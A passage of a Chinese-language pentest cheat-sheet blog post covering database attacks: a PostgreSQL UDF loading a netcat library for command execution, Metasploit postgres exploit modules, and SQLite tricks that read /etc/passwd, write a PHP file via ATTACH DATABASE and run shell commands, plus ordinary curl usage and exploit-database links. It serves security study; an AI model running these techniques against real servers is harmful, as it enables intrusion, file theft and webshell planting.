+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">postgres=# CREATE <span class="keyword">OR</span> <span class="built_in">REPLACE</span> <span class="keyword">FUNCTION</span> exec() RETURNS text AS  <span class="comment">'/tmp/nc.so', 'exec' LANGUAGE C STRICT;</span></span><br><span class="line">CREATE <span class="keyword">FUNCTION</span></span><br><span class="line">postgres=# <span class="keyword">SELECT</span> exec();</span><br><span class="line"><span class="built_in">server</span> closed the connection unexpectedly</span><br><span class="line">    This probably means the <span class="built_in">server</span> terminated abnormally</span><br><span class="line">    before <span class="keyword">or</span> <span class="keyword">while</span> processing the <span class="built_in">request</span>.</span><br><span class="line">The connection <span class="keyword">to</span> the <span class="built_in">server</span> was lost. Attempting reset: Failed.</span><br></pre></td></tr></table></figure>
+<hr>
+<p>####METASPLOIT POSTGRESQL模块####</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/<span class="keyword">admin</span>/postgres/postgres_readfile</span><br><span class="line"><span class="keyword">use</span> auxiliary/<span class="keyword">admin</span>/postgres/postgres_sql</span><br><span class="line"><span class="keyword">use</span> auxiliary/scanner/postgres/postgres_dbname_flag_injection</span><br><span class="line"><span class="keyword">use</span> auxiliary/scanner/postgres/postgres_login</span><br><span class="line"><span class="keyword">use</span> auxiliary/scanner/postgres/postgres_version</span><br><span class="line"><span class="keyword">use</span> auxiliary/<span class="keyword">server</span>/capture/postgresql</span><br><span class="line"><span class="keyword">use</span> exploit/linux/postgres/postgres_payload</span><br><span class="line"><span class="keyword">use</span> exploit/windows/postgres/postgres_payload</span><br></pre></td></tr></table></figure>
+<p>####参考链接####</p>
+<p><a href="https://github.com/sqlmapproject/udfhack/" target="_blank" rel="noopener">https://github.com/sqlmapproject/udfhack/</a><br><a href="https://github.com/sqlmapproject/sqlmap/issues/1170" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap/issues/1170</a><br><a href="http://zone.wooyun.org/content/4971" target="_blank" rel="noopener">http://zone.wooyun.org/content/4971</a><br><a href="http://drops.wooyun.org/tips/6449" target="_blank" rel="noopener">http://drops.wooyun.org/tips/6449</a><br><a href="http://bernardodamele.blogspot.com/2009/01/command-execution-with-postgresql-udf.html" target="_blank" rel="noopener">http://bernardodamele.blogspot.com/2009/01/command-execution-with-postgresql-udf.html</a>  </p>
+<h3 id="sqlite"><a href="#sqlite" class="headerlink" title="sqlite"></a>sqlite</h3><hr>
+<p>sqlite_hacking</p>
+<hr>
+<p>####连接数据库####</p>
+<p>让我们开始在命令提示符下键入一个简单的sqlite3命令，它将为您提供SQLite命令提示符，您将在其中发出各种SQLite命令。</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">┌─[<span class="keyword">lab</span>@core]─[~/share/pentestlab/Darknet]</span><br><span class="line">└──╼ sqlite3 temp.<span class="keyword">db</span></span><br><span class="line">SQLite <span class="keyword">version</span> 3.8.10.2 2015-05-20 18:17:19</span><br><span class="line">Enter <span class="string">".help"</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; .<span class="keyword">help</span></span><br><span class="line">.backup ?<span class="keyword">DB</span>? <span class="keyword">FILE</span>      Backup <span class="keyword">DB</span> (default <span class="string">"main"</span>) to <span class="keyword">FILE</span></span><br><span class="line">.bail <span class="keyword">on</span>|off           Stop after hitting <span class="keyword">an</span> <span class="keyword">error</span>.  Default OFF</span><br><span class="line">.binary <span class="keyword">on</span>|off         Turn binary output <span class="keyword">on</span> or off.  Default OFF</span><br><span class="line">.clone NEWDB           Clone data into NEWDB from the existing database</span><br><span class="line">.databases             <span class="keyword">List</span> names and files of attached databases</span><br><span class="line">.dbinfo ?<span class="keyword">DB</span>?           Show status information <span class="keyword">about</span> the database</span><br><span class="line">.dump ?<span class="keyword">TABLE</span>? ...      Dump the database <span class="keyword">in</span> <span class="keyword">an</span> SQL text <span class="keyword">format</span></span><br><span class="line">                         <span class="keyword">If</span> <span class="keyword">TABLE</span> specified, only dump tables matching</span><br><span class="line">                         LIKE pattern <span class="keyword">TABLE</span>.</span><br><span class="line">.echo <span class="keyword">on</span>|off           Turn command echo <span class="keyword">on</span> or off</span><br><span class="line">.eqp <span class="keyword">on</span>|off            Enable or disable automatic EXPLAIN <span class="keyword">QUERY</span> PLAN</span><br><span class="line">.<span class="keyword">exit</span>                  <span class="keyword">Exit</span> this <span class="keyword">program</span></span><br><span class="line">.explain ?<span class="keyword">on</span>|off?      Turn output mode suitable <span class="keyword">for</span> EXPLAIN <span class="keyword">on</span> or off.</span><br><span class="line">                         With <span class="keyword">no</span> <span class="keyword">args</span>, it turns EXPLAIN <span class="keyword">on</span>.</span><br><span class="line">.fullschema            Show schema and the content of sqlite_stat tables</span><br><span class="line">.headers <span class="keyword">on</span>|off        Turn <span class="keyword">display</span> of headers <span class="keyword">on</span> or off</span><br><span class="line">.<span class="keyword">help</span>                  Show this message</span><br><span class="line">.import <span class="keyword">FILE</span> <span class="keyword">TABLE</span>     Import data from <span class="keyword">FILE</span> into <span class="keyword">TABLE</span></span><br><span class="line">.indexes ?<span class="keyword">TABLE</span>?       Show names of all indexes</span><br><span class="line">                         <span class="keyword">If</span> <span class="keyword">TABLE</span> specified, only show indexes <span class="keyword">for</span> tables</span><br><span class="line">                         matching LIKE pattern <span class="keyword">TABLE</span>.</span><br><span class="line">.limit ?LIMIT? ?VAL?   <span class="keyword">Display</span> or change the value of <span class="keyword">an</span> SQLITE_LIMIT</span><br><span class="line">.load <span class="keyword">FILE</span> ?ENTRY?     Load <span class="keyword">an</span> extension library</span><br><span class="line">.<span class="keyword">log</span> <span class="keyword">FILE</span>|off          Turn logging <span class="keyword">on</span> or off.  <span class="keyword">FILE</span> can be stderr/stdout</span><br><span class="line">.mode MODE ?<span class="keyword">TABLE</span>?     <span class="keyword">Set</span> output mode where MODE is <span class="keyword">one</span> of:</span><br><span class="line">                         ascii    Columns/rows delimited <span class="keyword">by</span> 0x1F and 0x1E</span><br><span class="line">                         csv      Comma-separated values</span><br><span class="line">                         column   Left-aligned columns.  (See .width)</span><br><span class="line">                         html     HTML &lt;<span class="keyword">table</span>&gt; code</span><br><span class="line">                         insert   SQL insert statements <span class="keyword">for</span> <span class="keyword">TABLE</span></span><br><span class="line">                         <span class="keyword">line</span>     <span class="keyword">One</span> value per <span class="keyword">line</span></span><br><span class="line">                         <span class="keyword">list</span>     Values delimited <span class="keyword">by</span> .separator strings</span><br><span class="line">                         tabs     <span class="keyword">Tab</span>-separated values</span><br><span class="line">                         tcl      TCL <span class="keyword">list</span> elements</span><br><span class="line">.nullvalue STRING      <span class="keyword">Use</span> STRING <span class="keyword">in</span> place of NULL values</span><br><span class="line">.once FILENAME         Output <span class="keyword">for</span> the next SQL command only to FILENAME</span><br><span class="line">.<span class="keyword">open</span> ?FILENAME?       <span class="keyword">Close</span> existing database and reopen FILENAME</span><br><span class="line">.output ?FILENAME?     Send output to FILENAME or stdout</span><br><span class="line">.<span class="keyword">print</span> STRING...       <span class="keyword">Print</span> literal <span class="built_in">STRING</span></span><br><span class="line">.prompt MAIN <span class="keyword">CONTINUE</span>  <span class="keyword">Replace</span> the standard prompts</span><br><span class="line">.quit                  <span class="keyword">Exit</span> this <span class="keyword">program</span></span><br><span class="line">.<span class="keyword">read</span> FILENAME         Execute SQL <span class="keyword">in</span> FILENAME</span><br><span class="line">.<span class="keyword">restore</span> ?<span class="keyword">DB</span>? <span class="keyword">FILE</span>     <span class="keyword">Restore</span> content of <span class="keyword">DB</span> (default <span class="string">"main"</span>) from <span class="keyword">FILE</span></span><br><span class="line">.<span class="keyword">save</span> <span class="keyword">FILE</span>             Write <span class="keyword">in</span>-<span class="keyword">memory</span> database into <span class="keyword">FILE</span></span><br><span class="line">.scanstats <span class="keyword">on</span>|off      Turn sqlite3_stmt_scanstatus() metrics <span class="keyword">on</span> or off</span><br><span class="line">.schema ?<span class="keyword">TABLE</span>?        Show the CREATE statements</span><br><span class="line">                         <span class="keyword">If</span> <span class="keyword">TABLE</span> specified, only show tables matching</span><br><span class="line">                         LIKE pattern <span class="keyword">TABLE</span>.</span><br><span class="line">.separator COL ?ROW?   Change the column separator and optionally the row</span><br><span class="line">                         separator <span class="keyword">for</span> both the output mode and .import</span><br><span class="line">.<span class="keyword">shell</span> CMD <span class="keyword">ARGS</span>...     <span class="keyword">Run</span> CMD <span class="keyword">ARGS</span>... <span class="keyword">in</span> a system <span class="keyword">shell</span></span><br><span class="line">.show                  Show the current values <span class="keyword">for</span> various settings</span><br><span class="line">.stats <span class="keyword">on</span>|off          Turn stats <span class="keyword">on</span> or off</span><br><span class="line">.system CMD <span class="keyword">ARGS</span>...    <span class="keyword">Run</span> CMD <span class="keyword">ARGS</span>... <span class="keyword">in</span> a system <span class="keyword">shell</span></span><br><span class="line">.tables ?<span class="keyword">TABLE</span>?        <span class="keyword">List</span> names of tables</span><br><span class="line">                         <span class="keyword">If</span> <span class="keyword">TABLE</span> specified, only <span class="keyword">list</span> tables matching</span><br><span class="line">                         LIKE pattern <span class="keyword">TABLE</span>.</span><br><span class="line">.timeout MS            Try opening locked tables <span class="keyword">for</span> MS milliseconds</span><br><span class="line">.<span class="keyword">timer</span> <span class="keyword">on</span>|off          Turn SQL <span class="keyword">timer</span> <span class="keyword">on</span> or off</span><br><span class="line">.trace <span class="keyword">FILE</span>|off        Output each SQL statement <span class="keyword">as</span> it is <span class="keyword">run</span></span><br><span class="line">.vfsname ?AUX?         <span class="keyword">Print</span> the name of the VFS <span class="keyword">stack</span></span><br><span class="line">.width NUM1 NUM2 ...   <span class="keyword">Set</span> column widths <span class="keyword">for</span> <span class="string">"column"</span> mode</span><br><span class="line">                         Negative values right-justify</span><br></pre></td></tr></table></figure>
+<hr>
+<p>####生成####</p>
+<p>常见的sqlite功能（注释，concate，substr，十六进制，引用，….）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> select 1; -- comments</span></span><br><span class="line">1</span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> select <span class="string">'hello '</span> || <span class="string">'world'</span>;</span></span><br><span class="line">hello world</span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> select substr(<span class="string">'hello world'</span>, 1, 3);</span></span><br><span class="line">hel</span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> select hex(<span class="string">'a'</span>);</span></span><br><span class="line">61</span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> select quote(hex(<span class="string">'a'</span>));</span></span><br><span class="line">'61'</span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> PRAGMA database_list;</span></span><br><span class="line">0|main|/tmp/evil.php</span><br><span class="line">2|pwn|/tmp/evil.php</span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> PRAGMA temp_store_directory = <span class="string">'/tmp'</span>;</span></span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+<hr>
+<p>####读文件####</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt;</span><br><span class="line">sqlite&gt; CREATE TABLE pwn.data (data TEXT);</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">data      pwn.data</span><br><span class="line">sqlite&gt; .import /etc/passwd data</span><br><span class="line">sqlite&gt; select * from data;</span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/bin/nologin</span></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">data       pwn.data   pwn.shell  shell    </span><br><span class="line">sqlite&gt; DROP TABLE pwn.shell;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>####写文件####</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; ATTACH DATABASE <span class="string">'/tmp/evil.php'</span> as pwn;</span><br><span class="line">sqlite&gt; CREATE <span class="keyword">TABLE</span> pwn.shell <span class="comment">(code TEXT)</span>;</span><br><span class="line">sqlite&gt; INSERT INTO pwn.shell (code) VALUES (<span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">sqlite&gt; .quit</span><br><span class="line">┌─[✗]─[lab@core]─[~/share/pentestlab/Darknet]</span><br><span class="line">└──╼  <span class="keyword">file</span> /tmp/evil.php</span><br><span class="line">/tmp/evil.php: SQLite <span class="number">3.</span>x database</span><br><span class="line">┌─[lab@core]─[~/share/pentestlab/Darknet]</span><br><span class="line">└──╼  strings /tmp/evil.php</span><br><span class="line">SQLite format <span class="number">3</span></span><br><span class="line">Itableshellshell</span><br><span class="line">CREATE <span class="keyword">TABLE</span> shell <span class="comment">(code TEXT)</span></span><br><span class="line"><span class="number">1</span>&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>####命令执行####</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; .shell id</span><br><span class="line"><span class="attribute">uid</span>=1000(lab) <span class="attribute">gid</span>=1000(lab) <span class="attribute">groups</span>=1000(lab)</span><br><span class="line">sqlite&gt; .system id</span><br><span class="line"><span class="attribute">uid</span>=1000(lab) <span class="attribute">gid</span>=1000(lab) <span class="attribute">groups</span>=1000(lab)</span><br></pre></td></tr></table></figure>
+<hr>
+<p>####参考链接####</p>
+<p><a href="http://www.tutorialspoint.com/sqlite/" target="_blank" rel="noopener">http://www.tutorialspoint.com/sqlite/</a><br><a href="http://atta.cked.me/home/sqlite3injectioncheatsheet" target="_blank" rel="noopener">http://atta.cked.me/home/sqlite3injectioncheatsheet</a>  </p>
+<hr>
+<p>curl_hacking</p>
+<hr>
+<p>####常见操作####</p>
+<figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">curl http://curl.haxx.se</span><br><span class="line">curl http://site.&#123;<span class="attribute">one,two,three&#125;.com  </span></span><br><span class="line"><span class="attribute">curl ftp</span>://ftp<span class="variable">.numericals</span><span class="variable">.com</span>/file[1-100]<span class="variable">.txt</span>  </span><br><span class="line">curl ftp://ftp<span class="variable">.numericals</span><span class="variable">.com</span>/file[001-100]<span class="variable">.txt</span>  </span><br><span class="line">curl ftp://ftp<span class="variable">.letters</span><span class="variable">.com</span>/file[a-z]<span class="variable">.txt</span>  </span><br><span class="line"></span><br><span class="line">curl http://any<span class="variable">.org</span>/archive[1996-1999]/vol[1-4]/part&#123;a,b,c&#125;<span class="variable">.html</span>  </span><br><span class="line"></span><br><span class="line">curl http://www<span class="variable">.numericals</span><span class="variable">.com</span>/file[1-100:10]<span class="variable">.txt</span>  </span><br><span class="line">curl http://www<span class="variable">.letters</span><span class="variable">.com</span>/file[a-z:2]<span class="variable">.txt</span>  </span><br><span class="line"></span><br><span class="line">curl -o index<span class="variable">.html</span> http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/  </span><br><span class="line">curl http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/ &gt; index<span class="variable">.html</span>  </span><br><span class="line"></span><br><span class="line">curl -# http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/ &gt; index<span class="variable">.html</span>  </span><br><span class="line">  </span><br><span class="line">curl -0 http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/  </span><br><span class="line">curl --http1.1 http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/  </span><br><span class="line">curl --http2 http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/  </span><br><span class="line"></span><br><span class="line">curl -1 http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/  </span><br><span class="line">curl --tlsv1 http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/</span><br><span class="line"></span><br><span class="line">curl -2 http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/  </span><br><span class="line">curl --sslv2 http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/</span><br><span class="line"></span><br><span class="line">curl -3 http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/  </span><br><span class="line">curl --sslv3 http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/</span><br><span class="line"></span><br><span class="line">curl -4 http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/  </span><br><span class="line">curl --ipv4 http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/</span><br><span class="line"></span><br><span class="line">curl -6 http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/  </span><br><span class="line">curl --ipv6 http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/</span><br><span class="line"></span><br><span class="line">curl -A "wget/1.0" http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/  </span><br><span class="line">curl --user-agent "Mozilla/4.0 (compatible; <span class="attribute">MSIE 5.01; Windows NT 5.0)" [URL]</span></span><br><span class="line"><span class="attribute">curl --user-agent "Mozilla/4.73 [en] (X11; U; Linux 2.2.15 i686)" [URL]</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">curl -b "phpsession=Testtest" http</span>://demo<span class="variable">.com</span>/    </span><br><span class="line">curl --cookie "name=Daniel" http://curl<span class="variable">.haxx</span><span class="variable">.se</span></span><br><span class="line"></span><br><span class="line">curl -c cookies<span class="variable">.txt</span> http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/  </span><br><span class="line">curl --cookie-jar cookies<span class="variable">.txt</span> http://curl<span class="variable">.haxx</span><span class="variable">.se</span></span><br><span class="line"></span><br><span class="line">curl -d "username=admin&amp;password=pass" http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/  </span><br><span class="line">curl --data "birthyear=1905&amp;press=%20OK%20"  http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/when<span class="variable">.cgi</span></span><br><span class="line">curl --data-urlencode "name=I am Daniel" http://curl<span class="variable">.haxx</span><span class="variable">.se</span></span><br><span class="line">curl --data "&lt;xml&gt;" --header "Content-Type: text/xml" --request PROPFIND url<span class="variable">.com</span></span><br><span class="line"></span><br><span class="line">curl -e "http://referer" http://demo<span class="variable">.com</span>/  </span><br><span class="line">curl --referer http://curl<span class="variable">.haxx</span><span class="variable">.see</span> http://curl<span class="variable">.haxx</span><span class="variable">.se</span></span><br><span class="line"></span><br><span class="line">curl --header "Host:" http://curl<span class="variable">.haxx</span><span class="variable">.se</span></span><br><span class="line">curl --header "Destination: http://nowhere" http://curl<span class="variable">.haxx</span><span class="variable">.se</span></span><br><span class="line"></span><br><span class="line">curl -D - http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/  </span><br><span class="line">curl --dump-header headers_and_cookies http://curl<span class="variable">.haxx</span><span class="variable">.se</span></span><br><span class="line"></span><br><span class="line">curl -L http://github<span class="variable">.com</span>/  </span><br><span class="line">curl --location http://curl<span class="variable">.haxx</span><span class="variable">.se</span></span><br><span class="line"></span><br><span class="line">curl --dns-servers 8.8.8.8 http://demo<span class="variable">.com</span>/  </span><br><span class="line"></span><br><span class="line">curl --trace-ascii debugdump<span class="variable">.txt</span> http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/</span><br><span class="line">curl --form upload=@localfilename --form press=OK [URL]</span><br><span class="line">curl --upload-file uploadfile http://curl<span class="variable">.haxx</span><span class="variable">.se</span>/receive<span class="variable">.cgi</span></span><br><span class="line">curl --user name:password http://curl<span class="variable">.haxx</span><span class="variable">.se</span></span><br><span class="line">curl --proxy-user proxyuser:proxypassword curl<span class="variable">.haxx</span><span class="variable">.se</span></span><br><span class="line"></span><br><span class="line">curl --cert mycert<span class="variable">.pem</span> https://secure<span class="variable">.example</span><span class="variable">.com</span></span><br></pre></td></tr></table></figure>
+<hr>
+<p>####参考链接####</p>
+<p>$ man curl<br><a href="http://curl.haxx.se/docs/manual.html" target="_blank" rel="noopener">http://curl.haxx.se/docs/manual.html</a><br><a href="http://curl.haxx.se/docs/httpscripting.html" target="_blank" rel="noopener">http://curl.haxx.se/docs/httpscripting.html</a><br><a href="http://httpkit.com/resources/HTTP-from-the-Command-Line/" target="_blank" rel="noopener">http://httpkit.com/resources/HTTP-from-the-Command-Line/</a>  </p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com/</a></li>
+<li><a href="http://www.cvedetails.com/" target="_blank" rel="noopener">http://www.cvedetails.com/</a></li>
+<li><a href="http://packetstormsecurity.com/" target="_blank" rel="noopener">http://packetstormsecurity.com/</a></li>
+<li><a href="http://www.securityfocus.com/bid" target="_blank" rel="noopener">http://www.securityfocus.com/bid</a></li>
+<li><a href="http://nvd.nist.gov/" target="_blank" rel="noopener">http://nvd.nist.gov/</a></li>
+<li><a href="http://osvdb.org/" target="_blank" rel="noopener">http://osvdb.org/</a></li>
+<li><a href="http://cve.mitre.org/" target="_blank" rel="noopener">http://cve.mitre.org/</a></li>
+<li><a href="http://sec.jetlib.com/" target="_blank" rel="noopener">http://sec.jetlib.com/</a></li>
+<li><a href="http://0day.today/" target="_blank" rel="noopener">http://0day.today/</a></li>
+<li><a href="https://www.seebug.org/" target="_blank" rel="noopener">https://www.seebug.org/</a></li>
+<li><a href="https://www.rapid7.com/db/" target="_blank" rel="noopener">https://www.rapid7.com/db/</a></li>
+<li><a href="http://zerodayinitiative.com/advisories/published/" target="_blank" rel="noopener">http://zerodayinitiative.com/advisories/published/</a></li>
+<li><a href="http://exploitsearch.net/" target="_blank" rel="noopener">http://exploitsearch.net/</a></li>
+<li><a href="http://nvd.nist.gov/download/nvd-rss-analyzed.xml" target="_blank" rel="noopener">http://nvd.nist.gov/download/nvd-rss-analyzed.xml</a></li>
+<li><a href="http://www.intelligentexploit.com/" target="_blank" rel="noopener">http://www.intelligentexploit.com/</a></li>
+<li><a href="https://wpvulndb.com/" target="_blank" rel="noopener">https://wpvulndb.com/</a></li>
+<li><a href="http://www.wordpressexploit.com/" target="_blank" rel="noopener">http://www.wordpressexploit.com/</a></li>
+<li><a href="http://www.drupalexploit.com/" target="_blank" rel="noopener">http://www.drupalexploit.com/</a></li>
+<li><a href="http://www.openwall.com/lists/oss-security/" target="_blank" rel="noopener">http://www.openwall.com/lists/oss-security/</a></li>
+<li><a href="http://exploitsearch.net/" target="_blank" rel="noopener">http://exploitsearch.net/</a></li>
+<li><a href="https://www.vulnerability-lab.com/" target="_blank" rel="noopener">https://www.vulnerability-lab.com/</a></li>
+</ol>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+        
+            <li class="previous">
+                <a href= "/2017/12/15/Vilnerability-Assessment/" title= 漏洞评估-1 >
+                    <span>往后一页</span>
+                    <span>漏洞评估-1</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zMjI3OC84ODQy>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:447344932@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/doge-dog" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">Welcome, No. <span id="busuanzi_value_site_uv"></span> visitor.
+        </span>
+    </div>
+    
+
+
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
